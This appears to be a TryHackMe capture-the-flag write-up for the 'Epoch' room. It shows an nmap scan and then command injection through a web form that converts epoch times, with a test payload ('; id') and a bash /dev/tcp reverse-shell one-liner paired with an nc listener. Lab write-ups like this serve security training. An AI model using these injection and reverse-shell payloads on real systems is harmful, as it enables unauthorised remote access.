# Epoch from tryhackme writeup

## You can try it out here: https://tryhackme.com/room/epoch

Epoch is a date and time format that the computer uses..
This challenge invloves command injection vulnerability for the input we give

Let's jump in..
-------------------------------------------------------

As always let's do an nmap scan
```
# Nmap 7.92 scan initiated Tue Nov  1 05:40:30 2022 as: nmap -sC -sT -sV -A -oN epoch 10.10.247.137
Nmap scan report for 10.10.247.137
Host is up (0.27s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 f4:cf:40:3d:e7:9b:c8:f6:23:cb:64:2f:16:53:41:ed (RSA)
|   256 cf:dd:2c:9f:d4:b6:cc:22:b6:1f:c8:76:9e:a1:e9:47 (ECDSA)
|_  256 db:1f:85:48:5e:dd:d3:6c:a7:29:86:ef:05:34:2f:df (ED25519)
80/tcp open  http
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Tue, 01 Nov 2022 12:41:28 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 1184
|     Connection: close
|     <!DOCTYPE html>
|     <head>
|     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"
|     integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous">
|     <style>
|     body,
|     html {
|     height: 100%;
|     </style>
|     </head>
|     <body>
|     <div class="container h-100">
|     <div class="row mt-5">
|     <div class="col-12 mb-4">
|     class="text-center">Epoch to UTC convertor 
|     </h3>
|     </div>
|     <form class="col-6 mx-auto" action="/">
|     <div class=" input-group">
|     <input name="epoch" value="" type="text" class="form-control" placeholder="Epoch"
|   HTTPOptions: 
|     HTTP/1.1 405 Method Not Allowed
|     Date: Tue, 01 Nov 2022 12:41:29 GMT
|     Content-Type: text/plain; charset=utf-8
|     Content-Length: 18
|     Allow: GET, HEAD
|     Connection: close
|     Method Not Allowed
|   RTSPRequest: 
|     HTTP/1.1 405 Method Not Allowed
|     Date: Tue, 01 Nov 2022 12:41:30 GMT
|     Content-Type: text/plain; charset=utf-8
|     Content-Length: 18
|     Allow: GET, HEAD
|     Connection: close
|_    Method Not Allowed
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.92%I=7%D=11/1%Time=636113F9%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,529,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Tue,\x2001\x20Nov\x20202
SF:2\x2012:41:28\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\
SF:nContent-Length:\x201184\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20ht
SF:ml>\n\n<head>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"ht
SF:tps://stackpath\.bootstrapcdn\.com/bootstrap/4\.5\.2/css/bootstrap\.min
SF:\.css\"\n\x20\x20\x20\x20\x20\x20\x20\x20integrity=\"sha384-JcKb8q3iqJ6
SF:1gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP\+VmmDGMN5t9UJ0Z\"\x20crossorigin
SF:=\"anonymous\">\n\x20\x20\x20\x20<style>\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20body,\n\x20\x20\x20\x20\x20\x20\x20\x20html\x20{\n\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20height:\x20100%;\n\x20\x20\x20\x20\x20\x2
SF:0\x20\x20}\n\x20\x20\x20\x20</style>\n</head>\n\n<body>\n\x20\x20\x20\x
SF:20<div\x20class=\"container\x20h-100\">\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20<div\x20class=\"row\x20mt-5\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20<div\x20class=\"col-12\x20mb-4\">\n\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3\x20class=\"text-center\">Epo
SF:ch\x20to\x20UTC\x20convertor\x20\xe2\x8f\xb3</h3>\n\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20</div>\n\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20<form\x20class=\"col-6\x20mx-auto\"\x20action=\"/\">\n\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20cla
SF:ss=\"\x20input-group\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20<input\x20name=\"epoch\"\x20value=\"\
SF:"\x20type=\"text\"\x20class=\"form-control\"\x20placeholder=\"Epoch\"\n
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0")%r(HTTPOptions,BC,"HTTP/1\.1\x20405\x20Method\x20Not\x20Allowed\r\nD
SF:ate:\x20Tue,\x2001\x20Nov\x202022\x2012:41:29\x20GMT\r\nContent-Type:\x
SF:20text/plain;\x20charset=utf-8\r\nContent-Length:\x2018\r\nAllow:\x20GE
SF:T,\x20HEAD\r\nConnection:\x20close\r\n\r\nMethod\x20Not\x20Allowed")%r(
SF:RTSPRequest,BC,"HTTP/1\.1\x20405\x20Method\x20Not\x20Allowed\r\nDate:\x
SF:20Tue,\x2001\x20Nov\x202022\x2012:41:30\x20GMT\r\nContent-Type:\x20text
SF:/plain;\x20charset=utf-8\r\nContent-Length:\x2018\r\nAllow:\x20GET,\x20
SF:HEAD\r\nConnection:\x20close\r\n\r\nMethod\x20Not\x20Allowed");
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 5 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   94.94 ms  10.17.0.1
2   ... 4
5   332.06 ms 10.10.247.137

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Nov  1 05:43:47 2022 -- 1 IP address (1 host up) scanned in 197.60 seconds

```

we get this giant output, as we can see the webpage is open, let's enumerate that first
we are given with a standard webpage running some framework 
( as I can say that by looking at requests, we are interacting with "/" and not like "/index.php, index.html or index")

It requires input, let's give some data
like,
```
1667039240
```
we get,
```
Sat Oct 29 10:27:20 UTC 2022
```
Fine, lets see we can inject some code
```
1667039240; id
```

oh yes, we got,
```
Sat Oct 29 10:27:20 UTC 2022
uid=1000(challenge) gid=1000(challenge) groups=1000(challenge)
```

let's try to get reverse shell
on attacker's machine run
```
nc -lnvp <your_ip> 28282
```
on the webpage
```
1667039240; bash -c 'bash -i >& /dev/tcp/<your_ip>/28282 0>&1'
```

we get reverse shell
and now we can read flag
